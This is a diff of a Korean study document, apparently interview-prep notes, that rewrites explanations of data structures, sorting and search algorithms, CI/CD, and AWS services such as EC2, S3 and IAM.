-  자료구조란 데이터를 효율적으로 관리할 수 있는 데이터 구조를 의미한다. 선형구조(직선모양)와 비선형구조(곡선모양)로 나뉜다. 선형구조로는 배열(Array), 연결 리스트(Linked List), 데크(Deque), 스택(Stack), 큐(Queue)가 있고 비선형구조로는 트리(Tree), 그래프(Graph)가 있다.
+  자료구조란 데이터를 효율적으로 관리할 수 있는 데이터 구조를 의미한다. 자료의 저장 방식에 따라 선형 구조(Linear)와 비선형 구조(Non-Linear) 등으로 나뉜다.
 
-  ![자료구조](https://user-images.githubusercontent.com/85284246/178629531-dfac3453-33c7-4b5d-8317-5c4af5c1da2b.png)
+  [자료구조](https://user-images.githubusercontent.com/85284246/178629531-dfac3453-33c7-4b5d-8317-5c4af5c1da2b.png)
 
-<br>
+- 분류별 자료구조
 
-- Array
+- 선형 구조 : 데이터가 일렬로 저장된다. 연결 리스트(Linked List),등
 
-  데이터를 나열하고 각 데이터를 인덱스에 대응하도록 구성한 데이터 구조, 고정 길이이다.
+  1. Array(배열) : 기본적으로 고정 길이이며, 연속된 메모리 공간에 데이터를 저장한다. 인덱스를 이용해 데이터에 빠르게 접근할 수 있다.
 
-<br>
+  2. Stack(스택) : 스택은 늦게 넣은 데이터를 가장 먼저 꺼낼 수 있는 자료구조이다. 후입선출 방식이다.
 
-- Stack
+  3. Queue(큐) : 큐란 가장 먼저 넣은 데이터를 가장 먼저 꺼낼 수 있는 자료구조이다. 선입선출 방식이다.
 
-  스택은 늦게 넣은 데이터를 가장 먼저 꺼낼 수 있는 자료구조이다. 후입선출 방식이다.
+  4. Deque(데크) : 스택과 큐의 장점들을 모두 가지고 있는 방식으로 선입선출, 후입선출 모두 가능하다.
 
-<br>
+  5. Linked List(연결 리스트) : 각 노드는 데이터와 다음 노드에 대한 참조(포인터)를 가지고 있다. 일반적으로 링크드 리스트의 시작이 되는 노드는 헤드, 마지막 노드는 테일이라고 부른다.
 
-- Queue
+- 비선형 구조 : 계층적 또는 네트워크 형태로 저장된다. 트리(Tree), 그래프(Graph) 등
 
-  큐란 가장 먼저 넣은 데이터를 가장 먼저 꺼낼 수 있는 자료구조이다. 선입선출 방식이다.
+  - Heap(힙) : 항상 최댓값(최소 힙의 경우 최소값) 또는 최솟값(최대 힙의 경우 최대값)을 빠르게 찾을 수 있도록 구성된 완전 이진 트리 기반의 자료구조로 반정렬 상태이다.
 
-<br>
+  - Graph(그래프) : 단순히 노드(정점)와 그 노드(정점)를 연결하는 간선(링크)을 하나로 모아 놓은 자료 구조이다. 루트가 없고 노드 간 부모 자식 관계가 없고 사이클이 존재할 수 있다. 간선 수도 제한이 없다.
 
-- Deque
+  - Tree(트리) : Graph의 한 종류이다. 그래프와 차이점은 트리는 한 개의 루트 노드가 존재하고, 노드 간 부모 자식 관계를 가지고 있으며 사이클이 존재하지 않는 방향 그래프이다. 또 간선의 수는 노드 당 1개를 가지고 있고 계층 모델이다.
 
-  삽입과 삭제가 리스트의 양쪽 끝에서 모두 발생할 수 있는 자료구조이다. 스택과 큐의 장점들을 모두 가지고 있는 방식으로 선입선출, 후입선출 모두 가능하다.
+  - Binary Tree(이진트리) : 이진트리라고도 하며 모든 노드들이 최대 두 개의 자식 노드를 가진 트리 자료구조이다. 깊이 우선 탐색(DFS), 너비 우선 탐색(BFS) 같은 탐색 알고리즘과 밀접한 연관이 있다.
 
-<br>
+- 해시 기반 구조 (Hash-based Structure) : 키를 해시 함수로 변환해 빠르게 접근
 
-- Heap
+  - Hash table : 해시 테이블은 키를 해시 함수에 넣어 해시 값을 얻고 해시 값을 index로 사용하여 값과 함꼐 저장하는 자료 구조이다. 키(key), 값(value)이 하나의 쌍을 이루는 데이터 구조이다.
 
-  최대값과 최소값을 빠르게 찾아내도록 만들어진 완전이진트리를 기본으로 하는 자료구조로 반정렬 상태이다.
+- 특정 언어의 자료구조 비교
 
-<br>
-
-- Hash table
-
-  해시 테이블은 해시 함수를 사용하여 키를 해시 값으로 매핑하고, 이 해시 값을 색인(인덱스) 또는 주소 삼아 데이터를 key와 함께 저장하는 자료구조이다. 키(key)와 값(value)이 하나의 쌍을 이루는 데이터 구조이다.
-
-<br>
-
-- Graph
-
-  단순히 노드(정점)와 그 노드(정점)를 연결하는 간선(링크)을 하나로 모아 놓은 자료 구조이다.
-
-<br>
-
-- Tree
-
-  노드들이 나무 가지처럼 연결된 비선형 자료구조이다. Graph의 한 종류이다. 그래프와 차이점은 트리는 한 개의 루트 노드가 존재하고, 노드 간 부모 자식 관계를 가지고 있으며 사이클이 존재하지 않는 방향 그래프이다. 또 간선의 수는 노드 당 1개를 가지고 있고 계층 모델이다.
-
-<br>
-
-- Binary tree
-
-  이진트리라고도 하며 모든 노드들이 최대 두 개의 자식 노드를 가진 트리 자료구조이다.
-
-<br>
-
-- LinkedList
-
-  각 노드가 데이터와 포인터를 가지고 한 줄로 연결되어 있는 방식으로 데이터를 저장하는 자료구조이다. 각 노드의 포인터는 다음 노드의 주소를 값으로 가지고 있다. 일반적으로 링크드 리스트의 시작이 되는 노드는 헤드, 마지막 노드는 테일이라고 부른다.
-
-<br>
-
-- ArrayList
-
-  데이터를 나열하고 각 데이터를 인덱스에 대응하도록 구성한 데이터 구조, Array와 차이점은 길이가 가변한다는 것이다.
-
-<br>
-
-- List, Map, Set 차이
-
-  (1) List : 기본적으로 데이터들이 순서대로 저장되며 중복을 허용한다.
-
-  (2) Map : 순서가 보장되지 않고 Key값의 중복은 허용하지 않지만 Value값의 중복은 허용된다.
-
-  (3) Set : 순서가 보장되지 않고 데이터들의 중복을 허용하지 않는다.
+  | 자료구조 | 순서 유지  | 중복 허용        | Key-Value 구조 |
+  | -------- | ---------- | ---------------- | -------------- |
+  | List     | O          | O                | X              |
+  | Set      | X          | X                | X              |
+  | Map      | X (or O\*) | Key: X, Value: O | O              |
 
 <br><br><br>
 
@@ -10290,113 +10456,80 @@ function GenericReturnFunc<T>(arg: T): T {
 
 <br>
 
-### # **알고리즘**
-
-<br>
+### # 알고리즘
 
 - 알고리즘
 
-  어떤 문제를 해결하기 위해 사용되는 풀이과정을 말한다. 즉, 문제 해결 방법을 말한다. 효율적인 알고리즘이란 수행을 시작하여 결과가 도출될 때까지 실행에 걸리는 시간이 짧고 연산하는 컴퓨터 내의 메모리와 같은 자원을 덜 사용하는 것이 효율적이라고 할 수 있다.
-
-<br>
+  어떤 문제를 해결하기 위해 사용되는 풀이과정을 말한다. 즉, 문제 해결 방법을 말한다. 효율적인 알고리즘이란 수행을 시작하여 결과가 도출될 때까지 실행에 걸리는 시간이 짧고
+  연산하는 컴퓨터 내의 메모리와 같은 자원을 덜 사용하는 것이 효율적이라고 할 수 있다.
 
 - 시간 복잡도
 
-  알고리즘을 수행에 필요한 시간, 표기법으로 빅오엔, 빅세타, 빅오메가 등이 있으며 보통 최악의 수행 시간을 나타내는 빅오엔 표기법 O(n)을 활용한다.
-
-<br>
+  알고리즘을 수행에 필요한 시간을 나타낸다. 표기법으로 빅오엔, 빅세타, 빅오메가 등이 있으며 보통 최악의 수행 시간을 나타내는 빅오엔 표기법 O(n)을 활용한다.
 
 - 공간 복잡도
 
-  알고리즘 수행에 필요한 메모리 크기
-
-<br>
+  알고리즘 수행에 필요한 메모리 양을 나타낸다.
 
 - Big-O 표기법
 
   알고리즘에 시간 복잡도와 공간 복잡도를 표기하는 데 사용한다.
 
-<br>
-
 - 정렬 알고리즘
 
-  (1) 선택소트 : 미정렬 부분의 데이터 중에서 가장 작은 값을 선택하고, 선택된 값과 미정렬 부분의 첫 번째 데이터와 교환을 반복하는 알고리즘이다. 최선, 최악, 평균 O(n^2)
+  1. 선택소트 : 미정렬 부분의 데이터를 모두 탐색하여 가장 작은 값(혹은 큰)을 선택하고, 선택된 값과 미정렬 부분의 가장 첫 번째 데이터와 교환을 반복하는 알고리즘이다. 최선, 최악, 평균 O(n^2)
 
-  (2) 버블소트 : 한쪽 방향에서부터 시작하여 두 인접한 원소를 순차적으로 검사하며 정렬하는 알고리즘이다. 최선 O(n), 최악 O(n^2)
+  2. 버블소트 : 한쪽 방향에서부터 시작하여 두 인접한 원소를 순차적으로 검사하며 두 원소의 자리를 바꾸어 정렬하는 알고리즘이다. 최선 O(n), 최악 O(n^2)
 
-  (3) 힙소트 : 최대 힙 트리나 최소 힙 트리를 구성해 정렬을 하는 알고리즘으로, 내림차순 정렬을 위해서는 최소 힙을 구성하고 오름차순 정렬을 위해서는 최대 힙을 구성하면 된다.
+  3. 힙소트 : 최대 힙 트리나 최소 힙 트리를 구성해 정렬을 하는 알고리즘으로, 내림차순 정렬을 위해서는 최소 힙을 구성하고 오름차순 정렬을 위해서는 최대 힙을 구성하면 된다.
 
-  (4) 삽입소트 : 정렬이 완료되지 않은 자료를 선택하여 이미 정렬이 완료된 앞(왼쪽)의 자료들과 비교하여 삽입할 위치를 지정한 후 자료를 뒤로 옮기고 지정한 자리에 자료를 삽입하여 정렬하는 알고리즘이다. 최선 O(n), 최악 O(n^2)
+  4. 삽입소트 : 정렬이 완료되지 않은 데이터를 선택하여 이미 정렬이 완료된 앞(왼쪽)의 자료들과 비교하여 삽입할 위치를 지정한 후 자료를 뒤로 옮기고 지정한 자리에 자료를 삽입하여 정렬하는 알고리즘이다. 최선 O(n), 최악 O(n^2)
 
-  (5) 퀵소트 : 하나의 리스트를 선택한 요소(피벗)를 기준으로 두 개의 비균등한 크기로 분할하고 분할된 부분 리스트를 정렬한 다음, 두 개의 정렬된 부분 리스트를 합하여 전체가 정렬된 리스트가 되게 하는 알고리즘이다. 최선 O(nlogn), 최악 O(n)
+  5. 퀵소트 : 하나의 리스트를 선택한 요소(피벗)를 기준으로 두 개의 비균등한 크기로 분할하고 분할된 부분 리스트를 정렬한 다음, 두 개의 정렬된 부분 리스트를 합하여 전체가 정렬된 리스트가 되게 하는 알고리즘이다. 최선 O(nlogn), 최악 O(n)
 
-  (6) 머지소트 : 하나의 리스트를 두 개의 균등한 크기로 분할하고 분할된 부분 리스트를 정렬한 다음, 두 개의 정렬된 부분 리스트를 합하여 전체가 정렬된 리스트가 되게 하는 알고리즘이다. 최선, 최악, 평균 O(nlogn)
-
-<br>
+  6. 머지소트 : 하나의 리스트를 두 개의 균등한 크기로 분할하고 분할된 부분 리스트를 정렬한 다음, 두 개의 정렬된 부분 리스트를 합하여 전체가 정렬된 리스트가 되게 하는 알고리즘이다. 최선, 최악, 평균 O(nlogn)
 
 - 탐색 알고리즘
 
-  (1) 순차 탐색 알고리즘(Sequential Search) : 순차 탐색 알고리즘, 또는 선형 탐색 알고리즘은 리스트에서 특정한 값을 찾는 알고리즘의 하나다. 이것은 리스트에서 찾고자 하는 값을 맨 앞에서부터 끝까지 차례대로 찾아 나가는 것이다.
+  1. 순차 탐색 알고리즘(Sequential Search) : 리스트의 처음부터 끝까지 차례대로 비교하면서 값을 찾는 탐색 알고리즘
 
-  (2) 이진 탐색 알고리즘(Binary Search) : 오름차순으로 정렬된 리스트에서 특정한 값의 위치를 찾는 알고리즘이다. 처음 중간의 값을 임의의 값으로 선택하여, 그 값과 찾고자 하는 값의 크고 작음을 비교하는 방식을 채택하고 있다.
-
-<br>
+  2. 이진 탐색 알고리즘(Binary Search) : 정렬된 리스트에서 임의의 중간 값을 기준으로 왼쪽 또는 오른쪽 절반을 반복 탐색하여 임의의 중간 값과 찾고자 하는 값의 크기를 비교하며 탐색하는 알고리즘
 
 - 완전 탐색 알고리즘
 
-  (1) 재귀 알고리즘(Recursion) : 다른 말로는 재귀 함수라고 하며 자신을 다시 호출하여 작업을 수행하는 방식을 의미한다. 종료 조건이 꼭 포함되어야하며 반복문을 사용하는 코드는 항상 재귀 함수로 구현할 수 있다.
+  1. 재귀 알고리즘(Recursion) : 다른 말로는 재귀 함수라고 하며 자신을 다시 호출하여 작업을 수행하는 방식을 의미한다. 종료 조건이 꼭 포함되어야하며 반복문을 사용하는 코드는 항상 재귀 함수로 구현할 수 있다.
 
-  (2) 깊이 우선 탐색 DFS(Depth-First Search) : 루트 노드 혹은 다른 임의의 노드에서 시작해서 다음 분기로 넘어가기 전에 해당 분기를 완벽하게 탐색하는 알고리즘이다.
+  2. 깊이 우선 탐색 DFS(Depth-First Search) : 루트 노드 혹은 다른 임의의 노드에서 시작해서 다음 분기로 넘어가기 전에 해당 분기를 완벽하게 탐색하는 알고리즘이다.
 
-  (3) 너비 우선 탐색 BFS(Breadth First Search) : 루트 노드 혹은 다른 임의의 노드에서 시작해서 분기와 관계없이 인접한 노드를 먼저 탐색하는 알고리즘이다.
+  3. 너비 우선 탐색 BFS(Breadth First Search) : 루트 노드 혹은 다른 임의의 노드에서 시작해서 분기와 관계없이 인접한 노드를 먼저 탐색하는 알고리즘이다.
 
   ![깊이우선탐색_너비우선탐색_비교](https://user-images.githubusercontent.com/85284246/178636275-17ac00fe-d3d3-4f81-991e-85ec041264f1.gif)
 
-<br>
-
 - 최단 경로 알고리즘
 
-  (1) 다익스트라 알고리즘(Dijkstra) : 그래프에서 한 정점(노드)에서 다른 정점까지의 최단 경로를 구하는 알고리즘 중 하나이다. 이 과정에서 도착 정점 뿐만 아니라 모든 다른 정점까지 최단 경로로 방문하며 각 정점까지의 최단 경로를 모두 찾게 된다.
-
-<br>
+  1. 다익스트라 알고리즘(Dijkstra) : 가중치가 있는 그래프에서 한 정점으로부터 모든 정점까지의 최단 거리를 구하는 알고리즘.
 
 - 분할 정복 알고리즘(Divide and Conquer)
 
-  분할 정복 알고리즘은 주어진 문제를 작은 문제로 분할하여 문제를 해결하는 방법이나 알고리즘이다. 정렬 알고리즘의 퀵소트나 머지소트 문제와 고속 푸리에 변환(FFT) 문제가 대표적인 분할 정복 알고리즘이다.
-
-<br>
+  문제를 작은 문제로 분할하고, 각 문제를 해결한 후 합쳐서 전체 문제를 해결하는 알고리즘 설계 기법. 퀵소트, 머지소트 문제, 고속 푸리에 변환(FFT) 문제가 대표적인 분할 정복 알고리즘
 
 - 동적 계획법(Dynamic Programming)
 
-  이미 계산된 결과(하위 문제)는 별도의 메모리 영역에 저장하여 다시 계산하지 않도록 설계함으로써 메모리를 적절히 사용하여 수행 시간 효율성을 향상시키는 알고리즘이다.
-
-<br>
+  작은 문제의 결과를 저장하고 재사용하여 전체 문제를 해결하는 방식. 중복되는 계산을 줄여 효율을 높임
 
 - 탐욕 알고리즘(Greediness)
 
-  미래를 생각하지 않고 각 단계에서 가장 최선의 선택을 하는 알고리즘이다. 이렇게 각 단계에서 최선의 선택을 한 것이 전체적으로도 최선이기를 기대한다.
-
-<br>
+  각 단계에서 가장 최선의 선택을 하는 방식으로 전체 문제의 최적해를 구하려는 알고리즘
 
 - 몬테 카를로 알고리즘(Monte Carlo)
 
-  난수를 이용하여 어떤 함수의 답을 확률적으로 근접하게 계산하는 방식이다.
+  무작위 난수를 사용하여 확률적으로 정답에 근접하는 값을 추정하는 알고리즘.
 
 <br>
 
-### # **퍼지 문자열 검색이란?**
+### # 퍼지 문자열 검색
 
-<br>
-
-- 퍼지 검색 알고리즘은 유사한 문자열을 찾는 알고리즘으로 알고 있다. 예를 들어 초성 입력을 통해 추천 검색어를 나타내는 기능을 퍼지 검색 알고리즘으로 구현하는 것이다. 직접 퍼지 검색을 구현해본 적은 없으며 연습삼아 한글 퍼지 검색 라이브러리를 활용하여 구현해본 적은 있다.
-
-<br>
-
-### # **경쟁상대 알고리즘에 대해 분석하시고, 우리사이트에 어떻게 적용할 수 있을까요?**
-
-<br>
-
-- 당장 생각나는 방법은 개발자 탭에서 직접 소스 코드를 확인하는 방법 밖에 생각나지 않습니다. 하지만 소스 코드 분석은 매우 어려운 것으로 알고 있기 때문에 더욱 공부해야할 것 같습니다. 이 부분에 대해서는 더 공부하겠습니다.
+- 퍼지 문자열 검색은 정확하지 않은 입력에도 유사한 문자열을 찾아내는 검색 방법으로, 초성 검색 추천 기능도 퍼지 검색 알고리즘을 활용하는 대표적인 예이다
 
 <br><br><br>
 
@@ -10404,95 +10537,121 @@ function GenericReturnFunc<T>(arg: T): T {
 
 <br>
 
-### # **AWS 란?**
-
-<br>
+### # AWS
 
 - 배포 자동화란?
 
-  말 그대로 배포를 자동화하는 것이고 명령어 하나만으로 배포를 자동적으로 진행하는 것을 말한다. 배포 자동화를 통해 개발자는 개발에만 더욱 집중할 수 있고 주기적인 배포를 통해 사용자가 빠르게 최신 애플리케이션을 접할 수 있게 할 수 있다. 배포 자동화에서 자주 쓰이는 방식으로 CI/CD 방식이 있다. 나는 이전에 nextjs 프로젝트를 vercel을 통해 배포하였는데 vercel은 레파지토리를 연결하기만 하면 CI/CD를 자동으로 구축해주기 때문에 편리하다.
+  말 그대로 배포를 자동화하는 것이고 명령어 하나만으로 배포를 자동적으로 진행하는 것을 말한다. 배포 자동화를 통해 개발자는 개발에만 더욱 집중할 수 있어 개발자 경험이 향상되고
+  주기적인 배포를 통해 최신 버전을 빠르게 사용자에게 제공할 수 있습니다. 배포 자동화에서 자주 쓰이는 방식으로 CI/CD(지속적 통합/지속적 배포) 방식이 있다. 예를 들어 예를 들어 Next.js 프로젝트를
+  Vercel에 연결하면 레포지토리와 연동만으로 CI/CD가 자동 구축되어 매우 편리합니다.
 
-<br>
+- CI/CD (지속적 통합/지속적 배포)
 
-- CI, CD 방식이 무엇인지 아는지?
+  1. CI(Continuous Integration)
 
-  (1) CI(Continuous Integration) : 지속적인 통합을 의미하며 여러 개발자가 작성 및 수정한 코드를 주기적으로 빌드 및 테스트하면서 공유 레파지토리에 통합(merge)하는 것을 뜻한다. 즉 CI/CD 방식에서 CI의 역할은 빌드 및 테스트 자동화이다.
+  여러 개발자가 작성한 코드를 주기적으로 통합하는 과정을 말한다. 코드가 레포지토리에 병합되기 전에 자동으로 빌드하고 테스트해서 문제를 조기에 발견하고 해결할 수 있도록 돕는다.
+  즉 CI는 빌드, 테스트 자동화를 담당한다. (예: `PR 올림 → 자동 빌드 + 테스트 (CI)`, `PR 머지 → 프로덕션 배포 전 다시 빌드 + 테스트 (CI)`)
 
-  (2) CD(Continuous Delivery/Continuous Deployment) : 지속적인 서비스 제공 또는 지속적인 배포를 뜻한다. 공유 레파지토리에 CI를 통해 성공적으로 통합 된 내역을 사용자가 사용할 수 있는 배포 환경까지 릴리즈(출시)하는 것을 뜻한다. 즉 CI/CD 방식에서 CD의 역할은 배포 자동화이다. 또한 CD를 수행하기 전 코드의 테스트, 빌드, 통합은 필수이므로 CI가 항상 선행되어야 한다. CI를 성공적으로 마친 후 테스트 서버와 운영 서버에 곧바로 배포되는 환경을 CD라고 한다.
+  2. CD(Continuous Delivery/Continuous Deployment)
 
-  (3) CI/CD 방식 : 종합적으로 CI/CD 방식은 개발, 빌드, 통합, 배포, 릴리즈 등의 단계를 자동화하는 방식을 말하고 CI/CD 방식을 활용하면 개발 편의성이 증가되고 코드 품질을 유지할 수 있고 출시 기간 단축할 수 있다.
+  CI가 성공적으로 끝난 코드를 사용자에게 서비스 가능한 환경까지 자동으로 배포하는 과정이다. 즉 CI/CD 방식에서 CD의 역할은 배포 자동화이다. CD를 수행하기 전 코드의 테스트, 빌드,
+  통합은 필수이므로 CI가 항상 선행되어야 한다. CI를 성공적으로 마친 후 테스트 서버와 운영 서버에 곧바로 배포되는 환경을 CD라고 한다. (`예: PR 머지 후 빌드 테스트 통과 시 → 자동 배포 진행 (CD)`)
 
-  (4) CI/CD 파이프라인 : CI/CD 방식을 단계 별로 나누어 연결해놓은 구조를 말한다. CI/CD 방식의 파이프라인의 요소로는 빌드(소프트웨어 컴파일), 테스트(호환성 및 오류 검사), 릴리즈(버전 제어 저장소의 애플리케이션 업데이트), 배포(개발에서 프로덕션 환경으로의 변환), 규정 준수 및 유효성 검사 등이 있다.
+  3. CI/CD
 
-<br>
+  CI/CD는 개발부터 빌드, 테스트, 통합, 배포까지의 전 과정을 자동화하는 방식입니다. 이를 활용하면 개발 효율성이 높아지고 코드 품질 유지와 빠른 출시가 가능하다.
+
+- CI/CD 파이프라인
+
+  CI/CD의 여러 단계를 순차적으로 연결한 프로세스 구조이다. 주요 단계는 빌드(컴파일), 테스트(오류 및 호환성 검사), 릴리즈(버전 관리 저장소에 반영), 배포(프로덕션 환경 적용), 규정 준수 및 유효성 검사 등이 포함된다.
 
 - 클라우드 서비스(클라우드 컴퓨팅)란?
 
-  클라우드 서비스란 클라우드 컴퓨팅 기술을 사용하여 제공하는 서비스를 말한다. 클라우드 컴퓨팅 기술이란 인터넷을 통한 구독 기반의 기술로 서버, 스토리지, 소프트웨어 등 필요한 IT 자원을 자신의 컴퓨터가 아닌 클라우드에 연결된 다른 컴퓨터에서 제공해주는 기술을 의미한다.
-
-<br>
+  클라우드 서비스란 클라우드 컴퓨팅 기술을 사용하여 제공하는 서비스를 말한다. 클라우드 컴퓨팅 기술이란 인터넷을 통한 구독 기반의 기술로 서버, 스토리지, 소프트웨어 등
+  필요한 IT 자원을 자신의 컴퓨터가 아닌 클라우드에 연결된 다른 컴퓨터에서 제공해주는 기술을 의미한다.
 
 - 클라우드 서비스 사용 이유
 
-  (1) 시간 절약 : 직접 하드웨어 인프라나 서버를 갖추지 않아도 되기 때문에 장비 비용 절감 및 빠른 출시가 가능하다.
+  1. 시간 절약 : 직접 서버나 인프라를 구축하지 않아도 되어 초기 비용과 출시 시간을 크게 단축할 수 있다.
 
-  (2) 유연한 대응 : 서비스 범위에 따라 유연하게 자원을 증감할 수 있다. 이를 통해 예상치 못한 트래픽 폭주에도 신속하게 대응할 수 있다.
+  2. 유연한 대응 : 서비스 수요에 따라 자원을 쉽게 늘리거나 줄일 수 있어 갑작스런 트래픽 증가에도 빠르게 대응할 수 있다.
 
-  (3) 비용 절약 : 서비스를 이용한 만큼만 비용을 지불한다.
-
-<br>
+  3. 비용 절약 : 사용한 만큼만 비용을 지불하는 구조(Pay-as-you-go)로 불필요한 자원 낭비를 줄일 수 있다.
 
 - AWS 관련 용어
 
-  (1) EC2 (Elastic Compute Cloud) : AWS에서 제공하는 가상머신 서비스로 AWS의 데이터 센터에서 독립된 서버용 컴퓨터 한대를 임대해서 사용할 수 있게 해주는 서비스이다. AWS가 제공하는 URL(Public DNS)를 통해 이 컴퓨터에 접근할 수 있으며 다양한 사양 옵션을 제공한다. (EC2 인스턴스란 한 대의 컴퓨터를 의미)
+  1. EC2 (Elastic Compute Cloud)
 
-  (2) Secuirty Group : EC2 인스턴스에 대한 네트워크 트래픽을 제어하는 가상 방화벽 역할을 한다. 즉 Secuirty Group 설정을 해줘야 EC2 인스턴스에 HTTP와 SSH 접속이 가능하다.
+  AWS에서 제공하는 가상 서버 서비스로, 물리적 서버를 임대하듯 독립된 서버 환경을 사용할 수 있다. EC2 인스턴스란 이 가상 서버 한 대를 의미하며,
+  다양한 사양을 선택할 수 있다. AWS가 제공하는 URL(Public DNS)를 통해 인터넷에서 접근 가능하다.
 
-  (3) RDS(Relational Database Service) : AWS의 데이터베이스 서비스이다. RDS를 사용하면 사용자가 직접 서버를 생성해서 데이터베이스를 설치하고 설정하고 관리하지 않아도 된다. 그러면서 동시에 비용도 더 저렴하다. 사용자가 직접 데이터 베이스를 설치하고 운영하는 것보다 RDS를 사용하는것이 더 저렴하다.
+  2. Secuirty Group
 
-  (4) ELB(Elastic Load Balancing) : AWS에서 제공하는 로드 밸런서이다. 등록된 여러 서버의 상태를 모니터링 하면서 상태가 양호한 서버로만 트래픽을 라우팅(HTTP 요청 분산)하여 서버가 죽지 않도록 자동으로 관리해준다.
+  EC2 인스턴스에 대한 네트워크 접근을 제어하는 가상 방화벽입니다. HTTP, SSH 등의 포트를 열어줘야 외부에서 접속할 수 있습니다.
 
-  (5) Route 53 : AWS의 DNS 서비스이다. 도메인 등록, DNS 라우팅, 상태 확인 등 도메인과 관련된 다양한 서비스를 제공한다.
+  3. RDS(Relational Database Service)
 
-  (6) CloudFront : AWS의 CDN 서비스이다. 전 세계에 엣지 서버를 두고 클라이언트가 데이터 요청 시 가까운 엣지 서버에서 데이터를 제공할 수 있도록 하여 빠른 속도로 데이터를 제공할 수 있도록 한다. 또 추가적인 기능으로 HTTP로의 접속을 HTTPS로 리다이렉션 시켜주는 기능도 제공한다.
+  AWS가 관리하는 관계형 데이터베이스 서비스로, 사용자가 직접 설치 및 운영할 필요 없이 쉽게 데이터베이스를 운용할 수 있고 비용도 된다.
 
-  (7) S3(Simple Storage Service) : AWS의 파일 서버의 역할을 하는 서비스이다. 이름 그대로 파일을 쉽게 저장할 수 있는 공간을 제공한다. 파일을 저장 할 수 있을 뿐만이 아니라 파일마다 고유 주소를 부여해주기 때문에 S3에 저장한 파일을 웹상에서 쉽게 읽을 수 있다. 주로 사이트상의 이미지들을 저장하고 사이트에서 읽어들여 렌더링 해주는데 사용한다.
+  4. ELB(Elastic Load Balancing)
 
-  (8) PM2(Process Manager) : 노드js용 프로세스 관리 매니저이다. 무중단 배포를 지원하고 노드js는 싱글 스레드 기반이지만 클러스터 모드로 실행하여 프로세스를 원하는 수 만큼 쉽게 늘리고 줄일 수 있다. 프로세스가 늘어나면 성능과 안정성을 높일 수 있다.
+  여러 대의 서버에 트래픽을 분산시켜주는 로드 밸런서 서비스이다. 서버 상태를 실시간으로 모니터링하여 정상적인 서버로만 요청을 분배한다.
 
-  (9) 젠킨스(Jenkins) : CI툴이라고도 하며 소프트웨어 개발 시 지속적으로 통합 서비스를 제공하는 툴이다. 다수의 개발자들이 하나의 프로그램을 개발할 때 버전 충돌을 방지하기 위해 각자 작업한 내용을 공유영역에 있는 저장소에 빈번히 업로드함으로써 지속적 통합이 가능하도록 해준다.
+  5. Route 53
 
-  (10) IAM(Identity and Access Management) : AWS의 리소스에 개별적인 접근 권한을 제어하는 서비스이다. 한 루트 계정에 계정 또는 그룹 등 여러 개의 IAM 계정을 생성하여 각 게정마다 접근 가능한 서비스에 제한을 둘 수 있다.
+  AWS의 DNS(도메인 네임 시스템) 서비스로 도메인 등록, 트래픽 라우팅, 상태 확인 등을 제공한다.
 
-  (11) VPC(Virtual Private Cloud) : 사용자가 정의하는 가상의 네트워크이다. VPC를 적용하면 VPC별로 EC2 인스턴스를 묶어 독립적인 네트워크를 구성할 수 있고 각각의 VPC에 따라 네트워크 설정을 다르게 할 수 있다.
+  6. CloudFront
 
-  (12) WAF (Web Application Firewall) : 웹 애플리케이션 방화벽(WAF)은 웹의 비정상 트래픽을 탐지하고 차단하기 위한 방화벽이다.
+  AWS의 CDN(콘텐츠 전송 네트워크) 서비스로, 전 세계 엣지 서버에서 사용자에게 데이터를 빠르게 전송한다. HTTPS 리다이렉션 같은 보안 기능도 제공한다.
 
-<br>
+  7. S3(Simple Storage Service)
+
+  AWS의 객체 스토리지 서비스로, 파일을 저장하고 인터넷에 공개하거나 비공개로 관리할 수 있다. 웹사이트 이미지, 백업 등 다양한 용도로 사용된다. (ex 파일 서버)
+
+  8. PM2 (Process Manager 2)
+
+  Node.js 애플리케이션을 관리하는 프로세스 매니저이다. 무중단 배포, 클러스터 모드 실행 등을 지원해 애플리케이션 안정성과 성능을 높인다.
+
+  9. 젠킨스(Jenkins)
+
+  오픈소스 CI 도구로, 자동 빌드/테스트/배포 파이프라인을 구성하여 여러 개발자가 협업할 때 통합을 쉽게 해준다.
+
+  10. IAM(Identity and Access Management)
+
+  AWS 자원에 대한 사용자별 접근 권한을 관리하는 서비스이다. 루트 계정 외에 여러 사용자/그룹별 권한을 설정할 수 있다.
+
+  11. VPC(Virtual Private Cloud)
+
+  사용자가 직접 정의하는 가상 네트워크로, AWS 내에서 격리된 네트워크 환경을 만들어 보안과 네트워크 설정을 맞춤형으로 구성할 수 있다.
+
+  12. WAF (Web Application Firewall)
+
+  웹 애플리케이션에 대한 비정상적이고 악의적인 트래픽을 탐지, 차단하는 방화벽이다.
 
 - AWS S3, AWS EC2, AWS Amplify를 활용한 각 프론트 배포 방법 차이
 
   - AWS EC2
 
-    AWS EC2는 웹 서버 구축 과정이 필요하고, 비용이 S3보다 더 높고, S3보다 많은 설정(운영체제, 보안그룹, 스케일링 관리 등)이 필요하다는 단점이 있지만 그에 따라 많은 제어 또한 가능하다는 장점이 있다. AWS EC2는 웹 서버가 구축되어 있기 때문에 SSR 프로젝트에 적합하다. EC2로 배포하게 된 후 사용자가 접속하면 EC2 인스턴스에 요청이 전달되고 EC2 인스턴스에서 요청을 처리(SSR)하여 HTML 생성 후 응답하게 된다.
+    웹 서버 및 애플리케이션 서버를 직접 구축하고 운영해야 한다. 비용과 관리 부담이 크지만, 서버 측 렌더링(SSR) 프로젝트에 적합하며, 높은 제어권을 제공한다.
 
   - AWS S3
 
-    AWS S3는 웹 서버 구축 과정이 필요없고 정적인 컨텐츠(build 결과물인 HTML, CSS, Javascript 번들 등)를 배포할 수 있다. EC2에 비해 비용이 상대적으로 저렴하고 배포도 간편하며 보통 AWS CDN 서비스인 Cloudfront(HTTPS 사용, 캐시, 빠른 데이터 제공 등을 위해 사용)와 함께 사용된다. S3로 배포할 프로젝트는 정적 웹페이지로 CSR를 사용하는 프로젝트에 적합하다. S3를 통해 배포한 서비스에 SSR을 구현하기 위해서는 추가적인 작업이 필요하다. S3로 배포하게 된 후 사용자가 접속하면 Cloudfront에 요청이 전달되고 캐시서버에 캐싱 된 데이터가 없다면 S3에 요청을 전달하여 개발자가 업로드한 빌드 결과물을 응답한다. 브라우저는 응답받은 결과물 중 js를 통해 렌더링한다. 그리고 사용자가 다시 접속하게 되면 Cloudfront 캐시서버에 캐싱 된 데이터를 활용하여 응답한다.
